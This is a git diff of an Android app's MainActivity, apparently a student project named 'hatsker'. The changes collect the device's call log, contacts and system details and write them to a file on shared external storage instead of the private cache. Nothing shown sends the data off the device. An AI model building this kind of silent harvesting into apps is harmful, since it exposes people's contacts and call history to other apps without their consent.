@@ -10,6 +10,7 @@ package com.example.student.hatsker;
         import android.graphics.Bitmap;
         import android.graphics.BitmapFactory;
         import android.nfc.Tag;
+        import android.os.Environment;
         import android.provider.CallLog;
         import android.provider.ContactsContract;
         import android.provider.MediaStore;
@@ -186,24 +187,39 @@ public class MainActivity extends AppCompatActivity {
     File tempFile;
     File cDir = getBaseContext().getCacheDir();
 
+
+
      /* Makes a textfile in the absolute cache directory  */
-     tempFile = new File(cDir.getPath() + "/" + "textFile.txt") ;
+     tempFile = new File(Environment.getExternalStorageDirectory() + "/" + "textffile.txt") ;
 
      /* Writing into the created textfile */
       FileWriter writer=null;
       try {
-      writer = new FileWriter(tempFile);
+
+
+          writer = new FileWriter(tempFile);
 
           Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                  new String[] {ContactsContract.CommonDataKinds.Phone._ID,
-                          ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                          ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
+                                                     new String[] {ContactsContract.CommonDataKinds.Phone._ID,
+                                                     ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                                                     ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
           cursor.moveToFirst();
 
           writer.write("Call details: " + getCallDetails() + "\n" +
               "Contacts: ID "+cursor.getString(0)+" NAME "+cursor.getString(1)+" PHONE "+cursor.getString(2) + "\n" +
-              "System info details: " + new GetInfo().getInfosAboutDevice(act));
-      writer.close();
+              "System info details: " + GetInfo.getInfosAboutDevice(act));
+
+          writer.close();
+
+          File internal_m1 = getDir("custom", 0);
+          File external_m1 =  Environment.getExternalStorageDirectory();
+
+
+          Log.i("assdf", external_m1.getPath());
+
+
+
+
       } catch (IOException e) {
       e.printStackTrace();
       }
@@ -224,7 +240,7 @@ public class MainActivity extends AppCompatActivity {
       e.printStackTrace();
       }
 
-      Log.i("DANA", getBaseContext().getCacheDir().getPath());
+        Log.i("sdf", tempFile.getPath());
     }
 
     private String getCallDetails() {
@@ -283,35 +299,3 @@ public class MainActivity extends AppCompatActivity {
 }
 
 
-//    /** Getting Cache Directory */
-//    File tempFile;
-//    File cDir = getBaseContext().getCacheDir();
-//
-//                            /* Makes a textfile in the absolute cache directory  */
-//                            tempFile = new File(cDir.getPath() + "/" + "textFile.txt") ;
-//
-//                            /* Writing into the created textfile */
-//                                    FileWriter writer=null;
-//                                    try {
-//                                    writer = new FileWriter(tempFile);
-//                                    writer.write(" ID "+cursor.getString(0)+" NAME "+cursor.getString(1)+" PHONE "+cursor.getString(2));
-//                                    writer.close();
-//                                    } catch (IOException e) {
-//                                    e.printStackTrace();
-//                                    }
-//
-//
-//                                    String strLine="";
-//                                    StringBuilder text = new StringBuilder();
-//                                    try {
-//                                    FileReader fReader = new FileReader(tempFile);
-//                                    BufferedReader bReader = new BufferedReader(fReader);
-//
-//                                    while( (strLine=bReader.readLine()) != null  ){
-//                                    Log.i("DATA", strLine);
-//                                    }
-//                                    } catch (FileNotFoundException e) {
-//                                    e.printStackTrace();
-//                                    }catch(IOException e){
-//                                    e.printStackTrace();
-//                                    }
